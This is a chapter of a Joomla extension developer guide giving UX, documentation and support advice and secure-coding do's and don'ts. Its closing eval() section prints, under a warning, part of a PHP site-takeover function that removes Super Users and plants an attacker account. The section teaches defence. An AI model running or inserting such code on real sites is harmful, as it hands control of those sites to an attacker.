<?xml version="1.0" encoding="UTF-8"?>
<!--
Copyright © 2022 Nikolaos Dionysopoulos

Permission is granted to copy, distribute and/or modify this document under the terms of the GNU Free
Documentation License, Version 1.3 or any later version published by the Free Software Foundation; with
no Invariant Sections, no Front-Cover Texts, and no Back-Cover Texts. A copy of the license is included
in the section entitled "GNU Free Documentation License".
-->
<chapter version="5.1" xml:id="advice" xmlns="http://docbook.org/ns/docbook"
         xmlns:xlink="http://www.w3.org/1999/xlink"
         xmlns:xila="http://www.w3.org/2001/XInclude/local-attributes"
         xmlns:xi="http://www.w3.org/2001/XInclude"
         xmlns:trans="http://docbook.org/ns/transclusion"
         xmlns:svg="http://www.w3.org/2000/svg"
         xmlns:m="http://www.w3.org/1998/Math/MathML"
         xmlns:html="http://www.w3.org/1999/xhtml"
         xmlns:db="http://docbook.org/ns/docbook">
  <title>General advice and code magic</title>

  <para>There are a few concepts which apply universally to all Joomla
  extension types but don't quite fit in a category of their own. There are
  also more generic tips about what to do and what not to do when writing
  software. In this chapter we will explore some of those things.</para>

  <section xml:id="advice-clarity-unlocks-efficiency">
    <title>Clarity unlocks efficiency</title>

    <para>Instead of telling you what code to write, let's talk about all the
    non-code, development-adjacent things you do which lead to better code and
    a better product.</para>

    <bridgehead>The “chores” and why you need to do them</bridgehead>

    <para><emphasis role="bold">User experience (UX)</emphasis>. The cardinal
    sin of FOSS developers is that we take Eric S. Raymond's “<link
    xlink:href="https://en.wikipedia.org/wiki/The_Cathedral_and_the_Bazaar">The
    cathedral and the bazaar</link>” a bit too literally — I'll come back to
    that later. When it was written in 1997 it made sense. Back then computers
    were islands of information, isolated behind slow and expensive dial-up
    Internet connectivity, inhabited primarily by the native tribe of
    <emphasis>Homo Geekus</emphasis>. Fast forward 25 years and my decidedly
    non-technical mom who's in her 70s is using a smartphone and a tablet with
    an always-on Internet connection and <emphasis>we are the people writing
    the software she is using in the sites she's visiting</emphasis>. We no
    longer write software to scratch our own itch, we write software to
    scratch <emphasis>our users'</emphasis> itch. No longer can we expect that
    our users are geeks like us who will help us co-develop and debug the
    software, they are "normies". We have to understand who our users are,
    what is the task they are trying to accomplish (of which our software may
    only have a tertiary role in a fleeting interaction), and how we can
    provide them with the most frictionless experience. There are three
    lessons here:</para>

    <itemizedlist>
      <listitem>
        <para>We write software for regular people. We do not write software
        for geeks or machines. We must find out who our users are and in what
        context they end up using our software.</para>
      </listitem>

      <listitem>
        <para>Our software is, from a user's perspective, not anywhere near as
        important as it is for us. When we internalise it, it's a very
        humbling realisation which puts our overinflated egos in check. Take
        that into account when designing the interaction with the user and
        your user interface.</para>
      </listitem>

      <listitem>
        <para>The best software is that which is invisible and frictionless
        the user. The average modern car runs well over a million lines of
        code. The software controls the engine, the accelerator, the brakes
        (to a large extent; you still have emergency control of the brakes),
        your windshield wipers, the blinkers (for real!), the headlights, the
        infotainment system, the door locks, everything. You never stop to
        think about it while driving a car; it is out of sight, out of mind.
        This is the kind of interaction we must aim for with our
        software.</para>
      </listitem>
    </itemizedlist>

    <para>Ideally, there's far more to UX than what I mentioned here in
    passing. UX is a discipline and there's a lot us developers can learn from
    it, even if we do not have the resources to conduct a full, continuous UX
    research project. Some resources which can help you get started with that
    user-first mentality are:</para>

    <itemizedlist>
      <listitem>
        <para><link
        xlink:href="https://52weeksofux.com/post/385981879/you-are-not-your-user">You
        are not your user</link>. A quick introduction to the techniques used
        to start understanding your users.</para>
      </listitem>

      <listitem>
        <para><link
        xlink:href="https://www.nngroup.com/articles/false-consensus/">The
        False-Consensus Effect</link>. A slightly longer read, explaining the
        logical fallacies we succumb to and why testing with real users helps
        us overcome them.</para>
      </listitem>

      <listitem>
        <para>“The Undoing Project” by Micheal Lewis, ISBN 978-0-393-25460-0.
        An excellent book exploring how an unlikely friendship between two
        psychologist led to deep research into logical fallacies and earned
        the surviving member of that duo a Nobel Prize in Economics.</para>
      </listitem>

      <listitem>
        <para>“Thinking, Fast and Slow” by Daniel Khaneman, ISBN
        978-0-141-91892-1. Further exploration in how the human thought and
        decision making process works which ultimately helps you understand
        what seems like “irrational” behaviour by your users.</para>
      </listitem>
    </itemizedlist>

    <para><emphasis role="bold">Writing specifications</emphasis>. Writing
    software start well before the first line of code is written. After having
    done your UX research (hopefully!) you need to start designing the
    intended interaction with the user a.k.a. the feature you are going to
    write. Don't fire up your IDE yet! Start with pen and paper — or e-pen and
    tablet (I use an iPad Pro and an Apple Pencil with the Noteshelf app).
    This is a habit I picked up as an undergrad Mechanical Engineer. I never
    started working without having a detailed plan of what I am trying to do.
    Putting pen to paper is… <emphasis>magical</emphasis>. It forces you to
    think about everything you write down, how they interact, the non-obvious
    consequences they may have. You will be doing a lot of erasing, scrapping
    and redoing. Best do that at this early stage than after writing a bunch
    of code. By the end of it you will have a fairly detailed plan of how to
    proceed.</para>

    <para><emphasis role="bold">Prototyping (wireframes, UI samples, Proofs Of
    Concept)</emphasis>. If you are writing a non-trivial feature, or new
    software, you may not want to put all of the plumbing in there before you
    can get feedback from real world users about it. Start by making
    wireframes or UI samples (in plain HTML or even in a design application).
    Don't just describe what it would look like; users are not co-developers,
    as we already established. Get your users' feedback and re-iterate. If
    your feature requires a minimum of interaction, create a Proof of Concept
    — not all functionality needs to be implemented, just enough to get
    meaningful feedback from your users.</para>

    <para><emphasis role="bold">Testing</emphasis>. Whenever possible, test.
    Unit tests, integration tests, functional tests — whatever makes sense in
    the context of what you are writing. I am not the kind of crazy pedant who
    will tell you that if you do not get 100% test coverage you are doing it
    wrong. It's possible to get 100% test coverage but only test the happy
    path and the happy unhappy path. I cringe as I write it, but there is such
    a thing as the latter: it's when you only cover the
    <emphasis>expected</emphasis> failures you have already explicitly added
    checks for in your code. Instead, I say that you should automatically test
    what is <emphasis>meaningful</emphasis> in your use case.</para>

    <para>On the subject of testing, do not limit yourself to any automated or
    manual testing you are doing yourself. You are not the user and you have
    the innate tendency to follow the happy and unhappy paths you have already
    established in your head and written code for. Get real users to test what
    you wrote. Beta versions are great; beta versions where users who found
    bugs actually report them are even better. Try to incentivise users to
    report bugs — and rest assured that despite your best effort the stable
    version will have bugs someone discovered but didn't report. Don't dwell
    over why people neglected to report bugs; they have been conditioned to
    believe that their feedback never matters. Just take it in stride and fix
    them.</para>

    <para><emphasis role="bold">Documentation</emphasis>. “Is there anything
    more boring than writing documentation?” asked rhetorically the man who is
    currently writing documentation. Let me tell you the truth. No, there is
    nothing more boring. It is utterly, mind-numbingly, excruciatingly boring
    — and I wouldn't ever consider not writing it all the same. When you are
    writing documentation you put yourself in your user's shoes. What are they
    trying to accomplish? Try to take them by the hand and explain how that
    feature soup they perceive in your software can be transformed by a series
    of cohesive steps to accomplish a concrete goal. Try to imagine their
    struggle and preemptively provide answers for the non-obvious points which
    may create friction. Think about failure modes and document them, as well
    as how to address them. Writing documentation you are the user's friend,
    mentor, and guide. Writing documentation you shift your perspective from
    that of the developer who has to hold twenty variables and half a dozen
    methods in his head while writing code to that of a user and a teacher. It
    never ceases to amaze me how many problems I find in my software writing
    documentation and that's the reason I would never consider not writing it,
    even though it's so incredibly boring.</para>

    <para>I can also tell you how NOT to write documentation: the way Joomla's
    help screens are written, i.e. just listing a bunch of options and the
    tautological, to the point of being condescending, descriptions of such. I
    would like to think that “Enable Thingamajig” is obvious to the user that
    it means “Setting this option to Yes enables Thingamajig”. If the user
    can't figure <emphasis>that</emphasis> part out there's a more fundamental
    issue which cannot be addressed in documentation. So, please, don't write
    tautologies like that. A far better description of that option would
    concisely explain what Thingamajig is (and link to a previous
    documentation page covering it if it's a foundation concept which warrants
    further explanation!) and how it relates <emphasis>to the tasks the user
    will likely accomplish with it</emphasis>. Remember, documentation is
    there to help and guide the user, possibly even to do things they didn't
    realise were possible to begin with.</para>

    <para>You will receive feedback to your documentation. If the feedback
    sounds nonsensical, always ask the user the magic question “What is your
    use case? What were you trying to accomplish and why did you get
    frustrated reading the documentation?”. Nine out of ten times you'll find
    out the user has a good point, they just could not articulate it in a way
    which resonated with you. They knew what their use case is, they knew why
    they got frustrated, they never told you any of it but came up with and
    communicated a suggested fix. Since the user can't see beyond their own
    use case their suggested fix likely made no sense to you who are trying to
    negotiate all possible use cases — many of which you don't know yourself!
    — into a coherent documentation. That is to say, don't discount the user
    because they can't express themselves in your terms. Try to extract a
    small nugget of insight from their rant. It will benefit you both.</para>

    <para><emphasis role="bold">Support</emphasis>. 10 out of 10 people doing
    support will tell you that doing end user support sucks. This is by
    definition. Nobody comes to request support because everything is going
    swimmingly. The user tried to do something and your software stopped being
    invisible and frictionless for them. They may or may not have tried
    reading some of the documentation. They may or may not have tried figuring
    out a way to fix their problem. They have definitely failed in the latter.
    They are frustrated, and defensive for the software makes them feel
    inadequate and helpless. They come to you for help but they are in a very
    negative state of mind.</para>

    <para>I still want to interact with these people and I want you to do too.
    Most of the times they missed something obvious or misread something. I
    try to spot patterns there. If people are always missing the same thing
    over and over again does it mean that <emphasis>I, myself, have missed an
    obvious way to proactively help them</emphasis>? Maybe there is a
    technical way I can alleviate their pain? I would say that a good half of
    the improvement in my software have come from my qualitative observations
    on support requests.</para>

    <para>Even more important are the interactions with users who are
    completely and utterly lost. There are support requests which make you
    think “how the heck did that person get themselves in that spot?!”. When
    you are met with such a dissonance between what is the “obvious” way to
    use the software and what the user did it's very easy to assume the user
    is an idiot. That's where tech lore derisions like PEBKAC, ID10T, and
    Wetware Issue come from. These are only fun when reading the Bastard
    Operator From Hell which, if the title didn't give it immediately away, is
    satire and satire is always exaggerated and offensive.</para>

    <para>I want you to know that the user in the vast majority of cases is
    not stupid. They were trying to accomplish something. But what? You will
    never know unless you ask them “What is your use case? What were you
    trying to do? Why did you think that doing X was the best approach? I
    would like to understand your thought process so I can improve the
    software”. In most cases they will come up with a use case which is either
    perfectly reasonable or obviously unsuitable for your software. In the
    former case you'll have another use case you didn't know of and you can
    figure out how to best help the user accomplish it — even if it means
    making some changes. In the latter case you can help the user understand
    why they are looking at the wrong software. Either way, you will be
    helpful. There are a few cases where the user truly is beyond reason. But
    you know what? This is also helpful because it might give you more data
    points on how to modify your marketing material to weed out these people
    before they become users of your software.</para>

    <bridgehead>Clarity unlocks efficiency</bridgehead>

    <para>Everything I described above does not involve writing code. Oh, the
    horror! We are developers, shouldn't we be writing code?</para>

    <para>No, <emphasis>writing code is not an end in
    itself</emphasis>.</para>

    <para>We are modern day shamans, mediators between machine and people
    instead of mediators between spirits and people. Like shamans, we serve
    the people. That's the end. Code is the means to that end.</para>

    <para>Our software is but a small part of what a user needs to accomplish.
    When Alice wants to go to the prom, she needs a dress. She will go online,
    find the dress she wants, and order it from a site which runs our
    software. The shop will find her dress in their warehouse, pack it, and
    send it via a courier company. A lot more steps are involved until Alice
    gets her dress, tries it on, makes small alterations to fit it on her and
    look resplendent on a night she will remember fondly for the rest of her
    life. Our software? It was but a tiny sliver of her journey. If we did it
    right she didn't notice using it and she won't remember it when she's
    sharing her prom memories with her anxious granddaughter decades later. We
    facilitated this beautiful moment but our product which did that
    facilitating was <emphasis>invisible</emphasis>.</para>

    <para>To be able to offer this kind of experience there are some
    prerequisites. We need to understand who we are building the software for,
    which task it will be a part of, and how they expect it to work so that
    they don't have to stop and think about it. We need to understand the
    technical details of how it works and address all the messy human
    interactions with it which might make it not work according to the user's
    mental model. We have to do that in such a way that practically anyone can
    use it, regardless of their technical acumen or complete lack thereof. The
    more we know about all of that, the easier it is for us to write the
    software that becomes truly invisible and frictionless.</para>

    <para>Conversely, the less time we spend thinking about the users of the
    software and over-inflate the importance (therefore the expected
    visibility) of our software to the user, the less enjoyable our software
    becomes to use. The user has to stop and think. Can you conceive driving a
    car you had to think twice before pressing the brake pedal because doing
    so while your steering wheel is turned between 10 and 15 degrees would
    instead result in the car accelerating? Why do the equivalent in web
    software?! This will lead to a lot of friction with the users, a lot of
    unhappy back and forth, a lot of changes, nobody will be happy — not the
    users and not you the developer.</para>

    <para>So, what do you reckon is most efficient? Writing the software the
    “right” way from the very beginning, or eternally changing it without real
    vision, purpose, or sense trying to play catchup with the users
    complaints? The former is ostensibly faster than the latter, but is it
    <emphasis>really</emphasis>?</para>

    <para>Front-loading our time expenditure to non-code but
    development-adjacent tasks which provide us with clarity on the purpose
    and process of building software we end up spending less time to write
    better software. Or, to put it more concisely, <emphasis
    role="bold">clarity unlocks efficiency</emphasis>.</para>

    <para>Print that phrase and tape it to the wall behind your monitor. Every
    time you are about to moan about the “chores” you have to do instead of
    writing code read it out loud.</para>

    <bridgehead>Revisiting The Cathedral and The Bazaar</bridgehead>

    <para>As promised, I am coming back to that paper from 1997 and its
    follow-up book from 1999. While most of the points made in that paper and
    subsequent book are useful and accurate, there are a few which have not
    stood the test of time or at least have not been understood correctly. In
    those 25 years personal computing has evolved and with it the target
    audience of software and the way we write it. With the benefit of that
    hindsight, let's revisit some of the points made.</para>

    <blockquote>
      <para>Every good work of software starts by scratching a developer's
      personal itch.</para>
    </blockquote>

    <para>This is a fallacy, in that it assumes that the developer is the
    ultimate user of the software. While the original
    <emphasis>spark</emphasis> may come from a personal frustration, using it
    as the compass for development is self-defeating. Find your users' itch
    instead</para>

    <blockquote>
      <para>Plan to throw one [version] away; you will, anyhow</para>
    </blockquote>

    <para>This is nihilism. Do your homework, do your user research, write
    specifications, test your preliminary designs. If you do things like that,
    the right way, you will not have to throw away your first version.</para>

    <blockquote>
      <para>If you have the right attitude, interesting problems will find
      you.</para>
    </blockquote>

    <para>The key here is the right attitude. If you sit there twiddling your
    thumbs nothing interesting will ever happen. You need to actively solicit
    the right feedback which will let you see the interesting problems to
    solve.</para>

    <blockquote>
      <para>Treating your users as co-developers is your least-hassle route to
      rapid code improvement and effective debugging.</para>
    </blockquote>

    <para>This is the one thing that has most drastically evolved in these 25
    years. This is no longer the case. Big no!</para>

    <para>Your users are NOT co-developers, or guinea pigs! Your users are
    just that: your users. They want to <emphasis>use</emphasis> your
    software. Do your research before writing code. It's okay to ask your
    users for feedback before writing code as long as you're open to scrapping
    your original idea if need be. It's not okay asking them after the fact,
    seeking validation. And never, ever, tell a user “we are all overworked
    volunteers here, why don't you fix it and send us a code patch” for the
    same reason you wouldn't accept the chief mechanic of a car dealership
    tell you “we are overworked employees here, why don't you buy some tools
    and fix your car yourself?”</para>

    <para>Don't ask your users to debug your software and submit code patches.
    This is <emphasis>your</emphasis> job. Do ask them for access to their
    installation if that's the only way you can realistically debug an issue
    you cannot reproduce in any other way. You will find an unhappy path you
    were not aware of, letting you improve your software.</para>

    <blockquote>
      <para>Given a large enough beta-tester and co-developer base, almost
      every problem will be characterized quickly and the fix obvious to
      someone.</para>
    </blockquote>

    <para>Yeah, um, this concept died in the late 2000s / early 2010s, after
    the umpteenth time a user tried to report a bug in good faith and got
    ignored, ridiculed, told to pound sand because “we are all volunteers
    here”, or was asked to submit a PR with a code fix. As far as the user is
    concerned, reporting bugs is counter-productive.</para>

    <para>You can expect some issues to be reported, mostly by people who are
    developers or adjacent to development, e.g. power users and site
    integrators. Be ready for your first stable after a beta to come back with
    a bunch of bugs people had spotted in the beta but never reported.</para>

    <blockquote>
      <para>The next best thing to having good ideas is recognizing good ideas
      from your users. Sometimes the latter is better.</para>
    </blockquote>

    <para>Mostly right, as long as you understand what we explained earlier:
    users will not articulate their ideas in a way which makes sense to
    developers. Always ask them for their use case, no matter how dumb their
    suggestions sounds. That's how you will get to their ideas and figure out
    which ones are good.</para>

    <blockquote>
      <para>Perfection (in design) is achieved not when there is nothing more
      to add, but rather when there is nothing more to take away.</para>
    </blockquote>

    <para>I hate aphorisms like that because they can be misinterpreted in
    rather combative and counter-productive ways.</para>

    <para>Perfection lies squarely between the barren nothingness of stripping
    your software down to its bare essentials which makes it impossible to use
    in any meaningful way, and the proliferation of a myriad options which
    makes it impractical to use in any meaningful way. Knowing where
    perfection lies requires user research.</para>

    <blockquote>
      <para>To solve an interesting problem, start by finding a problem that
      is interesting to you.</para>
    </blockquote>

    <para>This is rooted on the false concept that the developer is the
    ultimate user of the software being written. Do not prioritise the
    problems which are interesting to you. Prioritise the problems which are
    interesting <emphasis>to your users</emphasis>.</para>

    <blockquote>
      <para>Provided the development coordinator has a communications medium
      at least as good as the Internet, and knows how to lead without
      coercion, many heads are inevitably better than one.</para>
    </blockquote>

    <para>The Internet is the most convenient, not the most efficient, medium
    of communication. Text-based communication lacks the nuance and social
    cues of personal interaction. You need face–to–face time with your team
    members, even if just over video conferencing. Ideally, you need
    participation in in-person sprints and events. I have solved far harder
    problems in a 30' Skype call or a 10' in-person chat than I have solved
    with 30 hours of going back and forth over GitHub issues and instant
    messaging.</para>

    <para>“Leading without coercion” is often misinterpreted as “I can't tell
    people what to do and not to do because they are volunteers”, i.e. not
    leading at all. A development coordinator's job is to provide a clear
    vision backed by UX research, guide volunteer contributors to do the work
    necessary to realising it and telling “no” to those who are getting
    sidetracked. This is not coercion; the social contract here is that the
    coordinator is willing to <emphasis>lead</emphasis> and the contributors
    are <emphasis>willing to be led</emphasis>. Those who are unwilling to
    adhere to this social contract need to leave or made to leave. Anything
    else leads to toxicity, disengagement, and stagnation.</para>
  </section>

  <section xml:id="advice-write-code-dont-suck">
    <title>Write code which doesn't suck</title>

    <para>Having audited several dozens of sites with hundreds of extensions I
    have seen the same old problems appearing in the code of extension after
    extension. Not only they are security incidents waiting to happen, they
    also make migrating your code to newer Joomla versions harder and break
    your extension in said Joomla versions.</para>

    <section xml:id="advice-dont-suck-hardcoded-queries">
      <title>DON'T: Hard-coded database queries</title>

      <para>I have seen bad code like this:</para>

      <programlisting language="php">$query = 'SELECT `something` FROM `#__whatever` WHERE `id` = ' . $db-&gt;quote($id);</programlisting>

      <para>It's even worse with there is no <code>$db-&gt;quote</code> at all
      because that ensures it's a SQL injection waiting to happen.</para>

      <para>Having a hard-coded database query is really bad because you are
      making an assumption the site runs under MySQL and that the escape
      character is the backtick. This is not a guarantee. Moreover, are you
      absolutely sure that you have not missed an escape in a long SQL query?
      Would you bet your and your clients' sites' security, as well as the
      possibility of massive fines due to GDPR if you have failed miserably,
      on your ability to not miss anything?</para>

      <para>Let's get real. Joomla has offered a database query builders since
      version 1.6 (released in 2010) and improved it in Joomla 4.</para>

      <para>Here's the simplest way to write the above code:</para>

      <programlisting language="php">$query = $db-&gt;getQuery(true)
                -&gt;select($db-&gt;quoteName('something'))
                -&gt;from($db-&gt;quoteName('#__whatever'))
                -&gt;where($db-&gt;quoteName('id') . ' = ' . $db-&gt;quote($id));</programlisting>

      <para>This is still not a very good approach because <code>$id</code>
      may look like a numeric string but actually be a hidden SQL Injection.
      Therefore a better way to write this query is using prepared statements
      which send the raw value of $id to the server and tell it what data type
      it is (boolean, null, blob, string or integer). The value is not
      interpolated into the query itself, making it perfectly safe against SQL
      injection attacks.</para>

      <programlisting language="php">$query = $db-&gt;getQuery(true)
                -&gt;select($db-&gt;quoteName('something'))
                -&gt;from($db-&gt;quoteName('#__whatever'))
                -&gt;where($db-&gt;quoteName('id') . ' = :id')
                -&gt;bind(':id', $id, \Joomla\Database\ParameterType::INTEGER);</programlisting>

      <note>
        <para>Prepared statements are only meant to be used when you have data
        coming from a variable. If you have hard-coded data you can still
        interpolate them after passing them through
        <code>$db-&gt;quote()</code>.</para>

        <para>Also note that any data —even data coming from another query
        which ostensibly only includes “safe”, hard-coded data you have
        inserted yourself in the database— MUST go through prepared
        statements. Anything which is not hard-coded in the code currently
        executing must be assumed to be potentially dangerous. Even data you
        inserted in the database and the user cannot modify through the
        interface <emphasis>can</emphasis> be modified by a malicious actor,
        e.g. using a SQL injection vulnerability in another extension.</para>

        <para><emphasis role="bold">TRUST NO-ONE, NOT EVEN
        YOURSELF.</emphasis></para>

        <para>That's the motto of the security conscious developer.</para>
      </note>
    </section>

    <section xml:id="advice-dont-suck-superglobals">
      <title>DON'T: Using superglobals ($_REQUEST, $_SERVER, $_GET, $_POST
      etc)</title>

      <para>Another very common problem I have seen in Joomla extensions is
      developers doing something like this:</para>

      <programlisting language="php">$something = $_REQUEST['something'];
                // or, worse, this
                $whatever = $_SERVER['WHATEVER'];</programlisting>

      <para><emphasis role="bold">DO NOT DO THAT. THIS IS A SECURITY
      ISSUE.</emphasis> There are very few cases where an extension needs
      access to the raw PHP superglobals, namely if you are writing a security
      extension and you need to check whether there's potentially malicious
      data in the request before Joomla sanitizes it. If you are one of the
      five or so people in the Joomla world writing this kind of software you
      are unlikely to be reading this. If you are about to say that you have a
      different, legitimate use case: you do NOT; you just don't know how to
      use Joomla's input class. Sorry.</para>

      <para>Joomla already provides an Input class which can return the
      <emphasis>filtered and sanitised</emphasis> values of a request or
      environment parameter. Moreover, it allows other parts of your code and
      plugins to modify or override the input parameters.</para>

      <para>The correct way to get something would be something like
      this:</para>

      <programlisting language="php">$something = \Joomla\CMS\Factory::getApplication()-&gt;input-&gt;request-&gt;getCmd('something', 'default');</programlisting>

      <para>If the object you are working with has its own input property use
      that instead of the global input object shown above. Dispatchers and
      Controllers do have their own input object which can of course be
      overridden during instantiation.</para>

      <para>If the object you are working with has its own property which
      gives you access to the application use that instead of going through
      the CMS Factory. This makes your code reusable and testable across
      applications.</para>

      <para>Do NOT get input variables from your Model or View classes. Your
      Controller should be the only point where you use the input object to
      retrieve input parameters. You can pass these values to your model by
      setting its <emphasis>state</emphasis>. Likewise, your view should only
      ever read the model's state, not the input directly. This makes your
      code reusable and testable. It also lets you make changes in the naming
      of your input parameters only making a change in your controller (and
      possibly your dispatcher) instead of trying to hunt down random uses
      spread throughout your code. It also makes you think about the data flow
      in your application which makes it infinitely easier to debug it.</para>

      <para>You should not use the entire request superglobal (e.g.
      <code>$this-&gt;input-&gt;getCmd('something')</code> or
      <code>$this-&gt;input-&gt;request-&gt;getCmd('something')</code>) if you
      know that a specific piece of data can only come as GET or POST data.
      Instead, be specific, e.g.
      <code>$this-&gt;input-&gt;get-&gt;getCmd('something')</code> for GET
      data and <code>$this-&gt;input-&gt;post-&gt;getCmd('something')</code>
      for POST data. This prevents <emphasis>input shading</emphasis>. If the
      same input is present in $_GET, $_POST, $_ENV, $_COOKIE and $_SERVER you
      will only get one value in the request. Which one? It depends on the PHP
      configuration (<code>request_order</code> and
      <code>variables_order</code> configuration keys). While on
      <emphasis>most</emphasis> servers it's GP (Get and Post, i.e. POST data
      overrides GET data) it could actually be anything with unpredictable
      consequences for your extension. For example, some servers may stupidly
      include cookies in request_order, thereby allowing a hacker to set a
      cookie on a victim's browser to make your extension do something other
      than the user's reasonable expectation, e.g. delete or modify a
      different record than what they were trying to delete / edit.</para>

      <para>Do not assume that the data you get from the input object is of a
      specific scalar type. For example,
      <code>$this-&gt;input-&gt;getInt('something')</code> may return an
      integer, null (the default value) or <emphasis>an array of
      integers</emphasis>. The latter is something that you are unlikely to
      have come across but that's the way the <code>get()</code> method of
      Joomla's input object works. Always check the type of the data you
      receive, always assume that there is a hacker trying to inject invalid
      data trying to trip your code up, always assume that any kind of
      filtering or sanitization may fail to work the way you assume it
      works.</para>

      <para>If you want to access the $_SERVER and $_ENV superglobals; don't.
      Instead go through <code>$this-&gt;input-&gt;server</code> and
      <code>$this-&gt;input-&gt;env</code>. For example, if I want to get the
      contents of the HTTP header X-Foo-Bar I should do
      <code>$this-&gt;input-&gt;server-&gt;getString('HTTP_X_FOO_BAR');</code>.</para>

      <para>Remember that Joomla can and will apply its text filters when you
      use <code>getString</code>. If you want to get the raw data use
      <methodname>getRaw</methodname> or <methodname>getArray</methodname> —
      neither method applies any filtering.</para>

      <para>Even though you can access the $_FILES superglobal with the input
      object — <emphasis role="bold">DO NOT DO THAT</emphasis>! You should
      never handle file uploads directly in your code. Always go through
      Joomla's <methodname>\Joomla\CMS\Filesystem\File::upload()</methodname>
      method. Do remember that, by default, it will try to prevent unsafe
      files from being uploaded. If you have a VERY good reason to allow
      “unsafe” files (e.g. you expect that a ZIP file containing PHP files
      will be used with your extension) and have taken responsible measures to
      prevent security issues you can of course set its
      <code>$allowUnsafe</code> parameter to <code>true</code>. If you need
      your extension to allow uploading of files with extensions or MIME types
      which are not media you can of course use custom file upload
      configuration in your own extension. This means that the excuse you may
      have had for using $_FILES directly is completely invalid so please
      don't let me see you ever accessing superglobals again.</para>
    </section>

    <section xml:id="advice-dont-suck-remote-addr">
      <title>DON'T: Using REMOTE_ADDR to get the user's IP</title>

      <para>It is very common for extensions to need access to the user's IP
      address. I see extensions doing silly things like this:</para>

      <programlisting language="php">$ip = $_SERVER['REMOTE_ADDR'];
                $ip = $this-&gt;input-&gt;server-&gt;get('REMOTE_ADDR');</programlisting>

      <para><emphasis role="bold">DO NOT DO THAT; THIS IS WRONG ON MANY
      LEVELS!</emphasis></para>

      <para>The first line tries to access the $_SERVER superglobal which, as
      mentioned in the previous section, is a security issue waiting to
      happen.</para>

      <para>Both of these lines make a wrong assumption: that the REMOTE_ADDR
      key of the server superglobal array will contain the user's IP address.
      This is not true if the server is behind a load balancer, CDN, firewall
      or any other kind of non-transparent proxy. In these cases a different
      HTTP header —typically X-Forwarded-For— may be used to convey the
      forwarding chain of IP addresses. However, you should NOT attempt to
      read this header yourself for two reasons. First of all, if the site is
      not behind a non-transparent proxy a malicious actor can send a forged
      X-Forwarded-For header to trick your extension into believing the
      request came from a different IP address than the one it actually
      originates. Second, this header may contain more than one IP address in
      a comma-separated list. Validating, sanitizing and parsing that list is
      tricky and may lead to some very bad times and security issues.</para>

      <para>Joomla 3.10 and later (including all 4.x releases and beyond)
      include a fork of my IPHelper class which deals with all of these
      details automatically. They also expose user-facing options in the
      Global Configuration so that the site owner can inform Joomla whether
      their site is behind a non-transparent proxy server.</para>

      <para>You can get the real IP address of the user with this:</para>

      <programlisting language="php">$ip = \Joomla\Utilities\IpHelper::getIp();</programlisting>

      <para>Even better, going through the IpHelper makes your code <emphasis
      role="bold">testable</emphasis>. Your unit tests can simply call:</para>

      <programlisting language="php">\Joomla\Utilities\IpHelper::setIp('1.2.3.4');</programlisting>

      <para>to set a fake IP address of your choice (IPv4 or IPv6).</para>

      <para>Finally, IpHelper has two more handy methods:
      <methodname>isIPv6</methodname> which tells you if you are dealing with
      an IPv6 address and <methodname>IPinList</methodname> which lets you
      figure out if an IP address is contained in an array which consists of
      any combination of IPv4/IPv6 addresses, IPv4 ranges (e.g.
      1.2.3.4-1.2.3.255), IPv4/IPv6 subnets in CIDR notation (e.g. 1.2.3.4/24)
      or IPv4 subnets in IP/Netmask notation (e.g. 192.168.1.0/255.255.255.0).
      Since many use cases for getting the user's IP address ultimately come
      down to checking if it belongs in a range of IP addresses or a list of
      allowed/blocked IP addresses you'll find the latter method extremely
      handy. I went through the pain of figuring out IP address maths and
      Joomla included my work in the core so you don't have to deal with it
      yourself!</para>
    </section>

    <section xml:id="advice-dont-suck-duplicate-libraries">
      <title>DON'T: Include duplicate copies of libraries shipped with Joomla
      itself</title>

      <para>A few weeks ago I was troubleshooting a client's Joomla 3 site and
      I noticed that there were six extensions which in total included four
      copies of TCPDF, six copies of SimplePie and four copies of PHPMailer.
      All these libraries are already shipped with Joomla itself.</para>

      <para>Do NOT include copies of libraries already included in Joomla with
      your software. If you absolutely have to —because you need a newer
      version than what Joomla provides— <emphasis role="bold">DO NOT USE THE
      SAME NAMESPACE AND CLASS NAMES</emphasis>. It will break Joomla or third
      party extensions when your code is loaded.</para>

      <para>In fact, even if you are including third libraries which are not
      included in Joomla you should be doing one of the following:</para>

      <itemizedlist>
        <listitem>
          <para>Do NOT load third party libraries except in a component's
          model which is never going to be used outside of your
          component.</para>
        </listitem>

        <listitem>
          <para>Change the namespace of your third party libraries using
          Rector.</para>
        </listitem>
      </itemizedlist>

      <para>The first method is not a fool-proof way to go about it. The third
      party library you are using may be included in Joomla or a different
      third party extension (worst case scenario: a system plugin which always
      loads this library) therefore causing your own code to break. This
      happened to me when I contributed the WebAuthn code to Joomla 4, thereby
      breaking my Login with Apple plugin which was using a newer version of
      one of the libraries used by the WebAuthn code. Oops.</para>

      <para>Changing the namespace of your dependencies with Rector is fairly
      trivial and guarantees that any third party libraries you include in
      your code will neither interfere with core or third party code, nor will
      they be interfered with by core or third party code. It's one more
      (small and simple) step building your extensions but it can make a
      massively positive difference to your clients who construct their sites
      out of prepackaged, mass-distributed code they can't (and usually don't
      even know how to) modify.</para>
    </section>

    <section xml:id="advice-dont-suck-evil-eval">
      <title>DON'T: Using <code>eval()</code></title>

      <para>Let me start by saying that allowing users to enter arbitrary PHP
      code which will be executed by the site is a <emphasis role="bold">VERY
      BAD IDEA</emphasis>. It is very easy for anyone with minimal developer
      experience —or someone following a how-to hacking guide— to take over a
      site. The following took me 5' to write and it's a complete takeover of
      a site:</para>

      <caution>
        <para><emphasis role="bold">DO NOT TRY THIS ON YOUR
        SITE!</emphasis></para>

        <para>The following code deletes all Super Users and adds a new Super
        User. This is detrimental to your site. It's only meant to demonstrate
        how easily a site can be taken over if a developer allows arbitrary
        PHP execution.</para>
      </caution>

      <programlisting language="php">function hackMePlenty()
                {
                $user = \Joomla\CMS\Factory::getContainer()
                -&gt;get(\Joomla\CMS\User\UserFactoryInterface::class)
                -&gt;loadUserByUsername('drevil1234');

                if ($user-&gt;username === 'drevil1234') return;

                $db    = \Joomla\CMS\Factory::getContainer()-&gt;get('DatabaseDriver')
                $query = $db-&gt;getQuery(true)
                -&gt;select([$db-&gt;quoteName('id')])
                -&gt;from($db-&gt;quoteName('#__usergroups'));

                $superUserGroups = array_filter(
                $db-&gt;setQuery($query)-&gt;loadColumn(0) ?: [],
                function ($group) {
                return \Joomla\CMS\Access\Access::checkGroup($group, 'core.admin');
                }
                );

                $existingSuperUsers = array_unique(
                array_reduce(
                $superUserGroups,
                function (array $carry, int $groupId) {
                return array_merge($carry, \Joomla\CMS\Access\Access::getUsersByGroup($groupId));
